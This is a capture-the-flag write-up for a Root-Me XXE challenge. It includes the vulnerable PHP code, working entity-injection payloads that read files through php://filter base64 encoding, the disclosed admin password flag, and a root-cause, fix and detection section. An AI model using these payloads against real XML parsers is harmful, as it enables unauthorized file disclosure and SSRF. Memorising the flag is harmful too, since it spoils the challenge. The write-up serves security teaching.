# Root-Me — Web-Server / XML External Entity (ch29)

- **Target:** http://challenge01.root-me.org/web-serveur/ch29/
- **Class:** XXE — external entity injection in an RSS "validity checker"
- **Author / date:** sambecks, 20 October 2014
- **Goal:** retrieve the administrator password

## Flag (administrator password)

```
c934fed17f1cac3045ddfeca34f332bc
```

**Byte caveat.** The `.passwd` file on disk is
`c934fed17f1cac3045ddfeca34f332bc\n` — 32 hex chars **plus a trailing newline** (33 bytes).
The login check is `$pass === "".file_get_contents(".passwd").""`, so the *literal* correct
password includes the `\n`. Submit the trimmed form to the validation field; the newline is
documented here because it is required for a real login. (Same trap as ch15/ch23.)

## The application

Two routes:

| Route | Behaviour |
|---|---|
| `?action=checker` (default) | POST `url` → fetches the URL, parses it as RSS, echoes item titles |
| `?action=auth` | POST `username`/`password` → login |

## The vulnerable code

Recovered via the XXE itself (see below) — `/challenge/web-serveur/ch29/index.php`:

```php
if($_GET['action'] == "checker"){

   libxml_disable_entity_loader(false);   // <-- XXE explicitly enabled
   libxml_use_internal_errors(true);
   ...
    if(isset($_POST["url"]) && !(empty($_POST["url"]))) {
        $url = $_POST["url"];
        echo "<p>URL : ".htmlentities($url)."</p>";
        try {
            $ch = curl_init("$url");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0);
            $inject = curl_exec( $ch );
            curl_close($ch);
            $string = simplexml_load_string($inject, null, LIBXML_NOENT);   // <-- entities expanded
            if ( ! is_object($string) || !$string || !($string->channel) || !($string->channel->item))
                throw new Exception("error");

            foreach($string->channel->item as $row){
                print "<br />"; print "=====...";
                print htmlentities($row->title);      // <-- entity content echoed here
                ...
            }
        } catch (Exception $e) {
            print "<h4 style='color: red;'>XML document is not valid</h4>";
        }
    }
}
...
if($_GET['action'] == "auth"){
    if(isset($_POST['username'], $_POST['password']) && ...) {
        $user=$_POST["username"];  $pass=$_POST["password"];
        if($user === "admin" && $pass === "".file_get_contents(".passwd").""){
            print "Flag: ".file_get_contents(".passwd")."<br />";
        }
    }
}
```

Three things conspire:

1. **`libxml_disable_entity_loader(false)`** turns external entity loading back on
   (needed on PHP < 8, where it defaults to disabled for security).
2. **`LIBXML_NOENT`** tells the parser to *substitute* entities — so `&xxe;` is replaced by
   the referenced content.
3. The substituted content is **printed** via `htmlentities($row->title)` — the classic
   XXE exfiltration sink.

The parser also requires the document to look like RSS (`$string->channel->item` must
exist), otherwise it throws. Any payload therefore needs a `<channel>` with at least one
`<item>`.

## Step 1 — Host a payload

The checker fetches over HTTP with **curl**, and the fetched content must be RSS-shaped.
`data://` is not supported by curl, so the payload has to live at a real HTTP URL reachable
from the target. I used `paste.rs`:

```bash
curl --data-binary @payload.xml https://paste.rs/
# -> https://paste.rs/XXXXX
```

Calibration (useful — the checker is strict about structure):

| URL submitted | Verdict |
|---|---|
| `https://news.ycombinator.com/rss` | valid (prints titles) |
| `https://lorem-rss.herokuapp.com/feed` | valid |
| `https://www.w3schools.com/xml/note.xml` (well-formed XML, not RSS) | not valid |
| RSS with no `<item>` | not valid |
| RSS **with** an `<item>` | valid |

## Step 2 — Confirm XXE

Internal entities are expanded, external ones too:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [<!ENTITY xxe "HELLO_INTERNAL_ENTITY">]>
<rss version="2.0"><channel><title>P</title><link>http://e.com</link>
<description>D</description>
<item><title>&xxe;</title><link>http://e.com/i</link><description>DD</description></item>
</channel></rss>
```

→ the page prints `HELLO_INTERNAL_ENTITY`. Entities are live.

## Step 3 — Discover the sandbox

Pointing the entity at `php://filter` produced PHP warnings that hand you the environment:

```
Warning: simplexml_load_string(): open_basedir restriction in effect.
  File(/etc/passwd) is not within the allowed path(s): (/challenge/web-serveur/ch29)
  in /challenge/web-serveur/ch29/index.php on line 32
```

So:

- **`open_basedir = /challenge/web-serveur/ch29`** — we can only read inside the challenge
  directory. `/etc/passwd` and sibling challenges are blocked.
- The script is `/challenge/web-serveur/ch29/index.php`, vulnerable call on **line 32**.
- `libxml_use_internal_errors(true)` only silences *libxml* errors — PHP's own stream
  warnings (`open_basedir`, `failed to open stream`) still render. That is what leaked the
  path.

## Step 4 — Read the source, then the secret

Use `php://filter/convert.base64-encode/resource=` so the file content comes back as
base64 — XML-safe (no `<`, `&`, or control bytes to break the parse) and easy to decode:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [<!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php">]>
<rss version="2.0"><channel><title>P</title><link>http://e.com</link><description>D</description>
<item><title>&xxe;</title><link>http://e.com/i</link><description>DD</description></item>
</channel></rss>
```

Decoding the base64 yields the full `index.php` above, which names the secret file:
`file_get_contents(".passwd")`.

Repeat with `resource=/challenge/web-serveur/ch29/.passwd`:

```
base64:  YzkzNGZlZDE3ZjFjYWMzMDQ1ZGRmZWNhMzRmMzMyYmMK
decoded: c934fed17f1cac3045ddfeca34f332bc\n
```

## Step 5 — Verify by effect

The check is `===` against the raw file content, so the newline matters:

| `username` | `password` | Result |
|---|---|---|
| `admin` | `c934fed17f1cac3045ddfeca34f332bc\n` | **`Flag: c934fed17f1cac3045ddfeca34f332bc`** |
| `admin` | `c934fed17f1cac3045ddfeca34f332bc` | no flag |
| `admin` | `x` | no flag |

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | no `url` posted | form only, no verdict | — |
| 2 | RSS with no `<item>` | rejected by the structure check | `XML document is not valid` |
| 3 | well-formed non-RSS XML (`note.xml`) | rejected | `XML document is not valid` |
| 4 | internal entity | expanded | `HELLO_INTERNAL_ENTITY` printed |
| 5 | entity → `/etc/passwd` | blocked | `open_basedir restriction in effect` |
| 6 | entity → `/challenge/web-serveur/ch23/index.php` (sibling) | blocked | `open_basedir restriction in effect` |
| 7 | entity → nonexistent file in ch29 | stream error | `failed to open stream: operation failed … on line 32` |
| 8 | entity → `/challenge/web-serveur/ch29/.passwd` | disclosed | base64 of the secret |
| 9 | login with trimmed password (no `\n`) | rejected | no flag |

Controls 5 and 6 are the interesting ones: the sandbox genuinely contains the blast radius
to one directory, so this XXE reads the challenge's own secret rather than the whole
filesystem. Control 9 confirms the byte-exact requirement.

## Root cause

1. **External entities enabled on purpose.** `libxml_disable_entity_loader(false)` plus
   `LIBXML_NOENT` is an explicit opt-in to the exact behaviour XXE depends on. The safe
   default (`true`, no `NOENT`) would have blocked this outright.
2. **Parsing attacker-supplied XML at all.** The app fetches a URL the user chose and feeds
   the response to an XML parser. The trust boundary is drawn in the wrong place: the
   *remote document* is untrusted, but it is treated as data the parser may dereference.
3. **No `LIBXML_NONET`.** Network entities (`http://…`) are permitted, which also makes
   this a usable SSRF/port-scanner primitive.
4. **Verbose error output.** Path, line number and `open_basedir` value leaked in warnings,
   shortening recon considerably.
5. **Secret stored next to the code, plaintext, in a dotfile.** `.passwd` is served by the
   app itself and sits inside the readable directory, so any read primitive wins outright.

## Fix

- **Don't enable external entities.** Remove `libxml_disable_entity_loader(false)`, and
  parse without `LIBXML_NOENT`:

  ```php
  $xml = simplexml_load_string($inject, 'SimpleXMLElement', LIBXML_NONET | LIBXML_NOCDATA);
  ```

  On PHP ≥ 8.0 external entity loading is disabled by default and
  `libxml_disable_entity_loader()` is a no-op — but you must still avoid `LIBXML_NOENT`.

- **Block dangerous stream wrappers** for the fetch. Validate the URL scheme against an
  allowlist (`http`/`https` only), and reject private/loopback address ranges:

  ```php
  $p = parse_url($url);
  if (!in_array($p['scheme'] ?? '', ['http','https'], true)) { /* reject */ }
  ```

  Better still, **don't let users choose the URL**. Fetch from a fixed allowlist of feed
  hosts, or accept the feed *body* and parse it — never both.

- **Constrain the network path** with `CURLOPT_PROTOCOLS` (curl) / `LIBXML_NONET` (libxml)
  so a fetched document cannot make further requests.

- **Turn off verbose errors in production** (`display_errors=Off`, log server-side). The
  `open_basedir` disclosure was avoidable.

- **Keep secrets out of the web root.** `.passwd` should not be readable by the
  application's own read primitive; store credentials in the environment or a file outside
  `open_basedir`, and hash them (`password_hash()`), so disclosure yields a digest.

- Return a generic error and rate-limit the checker — it is otherwise a free file-read
  oracle.

## Generalisation

XXE is a *parser configuration* bug more than a coding one. The pattern to grep for:

- `libxml_disable_entity_loader(false)`, `LIBXML_NOENT`, `LIBXML_DTDLOAD`
- `DocumentBuilderFactory.setFeature("…disallow-doctype-decl", false)`
- Python `lxml` with `resolve_entities=True` / `no_network=False`
- Any XML parser fed a **remote document** — the fetched file is untrusted input too, not
  just the request body

And the transferable exfiltration technique: **`php://filter/convert.base64-encode/resource=`**
converts an arbitrary file read into XML-safe ASCII, so binary files, source code and files
containing `<`/`&` all come back intact. Always pair it with `open_basedir`/`realpath`
probing to map what is actually reachable before assuming a full filesystem read.
